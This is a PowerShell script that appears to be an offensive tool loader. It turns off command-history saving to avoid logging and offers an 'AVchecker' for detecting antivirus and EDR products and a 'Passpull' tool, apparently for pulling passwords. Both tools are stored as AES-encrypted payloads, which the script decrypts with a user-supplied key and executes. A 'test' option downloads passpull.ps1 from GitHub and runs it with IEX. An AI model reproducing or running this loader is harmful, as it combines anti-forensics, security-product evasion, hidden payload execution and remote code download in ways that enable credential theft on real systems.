Set-PSReadlineOption -HistorySaveStyle SaveNothing
echo "Logging Turned Off"


echo "-------------------"
echo "Please provide key"
echo "-------------------"
$pw = Read-Host -AsSecureString


function list-tools {
   echo "--------------------------------"
   echo "To use tool"
   echo "get-tool [tool name]"
   echo "--------------------------------"
   echo ""
   echo "ALL TOOLS"
   echo "--------------------------------"
   echo ""
   echo "AVchecker - Compares processes and services against a list of known AV / EDR fingerprints"
   echo "Passpull - "

}

function get-tool ($a) {

   if ( $a -eq "AVchecker" )
   {
       $C = "zo8EKIetLaqu8bfyznDyCZKA0ji44KR6+MD3jDuqQb0XTvHUG1GT6xSnjA84LRYGxVePCvhdfbuVg+22YTf570rtoy0pSDtB9AUMYGn4gkI3DC0BU0yu8A5sFtNQrvHOgOg+w2KrNW1wJAhT8dqhcQb4BkHkTWNa1kGUJWRtfiI="
   }
   if ( $a -eq "Passpull" )
   {
       $C = "zo8EKIetLaqu8bfyznDyCZKA0ji44KR6+MD3jDuqQb0XTvHUG1GT6xSnjA84LRYGxVePCvhdfbuVg+22YTf570rtoy0pSDtB9AUMYGn4gkIQgkQqWGp7QN+tQ1mikiA++fa8CuwIOLwtuVI32rpDfbIa0uthwtchvLRQSWPD2YY="
   }   
   if ( $a -eq "test")
   {
       IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kahvi-0/ADEnum/main/passpull.ps1')
   }   


   $e = [pscredential]::new('user',$pw).GetNetworkCredential().Password
   $encryptedCommand = $C
   $key = [Convert]::FromBase64String($e)
   $iv = [Convert]::FromBase64String("W5z4DRGbemrndb9vpInf+A==")
   $aes = New-Object System.Security.Cryptography.AesManaged
   $aes.Key = $key
   $aes.IV = $iv
   $decryptor = $aes.CreateDecryptor()
   $buffer = [Convert]::FromBase64String($encryptedCommand)
   $decrypted = $decryptor.TransformFinalBlock($buffer, 0, $buffer.Length)
   $decryptedCommand = [Text.Encoding]::UTF8.GetString($decrypted)
   powershell . $decryptedCommand
}

list-tools
